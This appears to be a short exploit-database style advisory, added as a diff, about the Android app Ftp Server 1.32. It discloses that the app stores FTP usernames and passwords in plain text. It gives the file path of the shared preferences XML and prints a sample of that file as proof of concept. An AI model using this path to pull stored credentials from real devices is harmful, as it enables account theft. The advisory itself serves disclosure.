@@ -1,0 +1,33 @@
+# Exploit Title: Ftp Server 1.32 - Credential Disclosure
+# Date: 2018-05-29
+# Software Link: https://play.google.com/store/apps/details?id=com.theolivetree.ftpserver
+# Version: 1.32 Android App
+# Vendor: The Olive Tree
+# Exploit Author: ManhNho
+# CVE: N/A
+# Category: Mobile Apps
+# Tested on: Android 4.4
+
+# Description
+# Ftp Server 1.32 Insecure Data Storage, the result of storing confidential
+# information insecurely on the system i.e. poor encryption, plain text, 
+# access control issues etc. Attacker can find out username/password of valid user via
+# /data/data/com.theolivetree.ftpserver/shared_prefs/com.theolivetree.ftpserver_preferences.xml
+
+# PoC
+
+<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="prefPort">2221</string>
+    <string name="prefPasivePort">2300-2399</string>
+    <string name="prefUserpass">ManhNho</string>
+    <boolean name="prefEnergySave" value="false" />
+    <boolean name="prefShowHidden" value="false" />
+    <boolean name="prefShowCredentials" value="true" />
+    <string name="prefInterfaces">0</string>
+    <string name="prefHomeDir">1</string>
+    <string name="prefUsername">ManhNho</string>
+    <boolean name="prefReadonly" value="false" />
+    <boolean name="prefAnonymous" value="true" />
+    <boolean name="prefForeground" value="true" />
+</map>
